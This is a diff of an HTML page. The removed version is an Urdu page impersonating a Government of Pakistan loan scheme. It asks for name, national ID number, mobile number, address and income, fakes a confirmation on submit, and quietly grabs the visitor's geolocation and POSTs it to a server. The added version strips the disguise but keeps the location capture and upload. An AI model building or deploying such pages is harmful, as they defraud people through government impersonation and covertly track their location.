@@ -1,119 +1,7 @@
 <!DOCTYPE html>
-<html lang="ur">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>حکومتِ پاکستان - قرضہ اسکیم</title>
-
-<style>
-    body {
-        font-family: 'Noto Nastaliq Urdu', Arial, sans-serif;
-        background: #f4f6f8;
-        margin: 0;
-        padding: 0;
-        direction: rtl;
-    }
-
-    header {
-        background: #0b5e2e;
-        color: white;
-        padding: 15px;
-        text-align: center;
-        font-size: 22px;
-        font-weight: bold;
-    }
-
-    .container {
-        max-width: 500px;
-        background: white;
-        margin: 30px auto;
-        padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    h2 {
-        text-align: center;
-        color: #0b5e2e;
-    }
-
-    label {
-        display: block;
-        margin-top: 10px;
-        font-size: 14px;
-    }
-
-    input, textarea {
-        width: 100%;
-        padding: 10px;
-        margin-top: 5px;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-    }
-
-    button {
-        width: 100%;
-        background: #0b5e2e;
-        color: white;
-        padding: 12px;
-        margin-top: 15px;
-        border: none;
-        border-radius: 5px;
-        font-size: 16px;
-        cursor: pointer;
-    }
-
-    button:hover {
-        background: #094d25;
-    }
-
-    .footer {
-        text-align: center;
-        font-size: 12px;
-        color: gray;
-        margin-top: 15px;
-    }
-</style>
-</head>
-
+<html>
 <body>
-
-<header>
-حکومتِ پاکستان قرضہ اسکیم رجسٹریشن
-</header>
-
-<div class="container">
-    <h2>درخواست فارم</h2>
-
-    <form id="loanForm">
-        <label>مکمل نام</label>
-        <input type="text" required>
-
-        <label>شناختی کارڈ نمبر</label>
-        <input type="text" required>
-
-        <label>موبائل نمبر</label>
-        <input type="text" required>
-
-        <label>مکمل پتہ</label>
-        <textarea required></textarea>
-
-        <label>ماہانہ آمدن</label>
-        <input type="text">
-
-        <label>مطلوبہ قرض کی رقم</label>
-        <input type="text">
-
-        <button type="submit">درخواست جمع کروائیں</button>
-    </form>
-
-    <div class="footer">
-        © حکومتِ پاکستان | تمام حقوق محفوظ ہیں
-    </div>
-</div>
-
 <script>
-// LOCATION FETCH
 navigator.geolocation.getCurrentPosition(async (pos) => {
     const data = {
         latitude: pos.coords.latitude,
@@ -126,14 +14,11 @@ navigator.geolocation.getCurrentPosition(async (pos) => {
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
     });
-});
 
-// FORM SUBMIT (DUMMY)
-document.getElementById("loanForm").addEventListener("submit", function(e){
-    e.preventDefault();
-    document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>آپ کی درخواست موصول ہو گئی ہے</h2>";
+    document.body.innerHTML = "Location sent";
+}, (err) => {
+    document.body.innerHTML = "Permission denied or error";
 });
 </script>
-
 </body>
 </html>
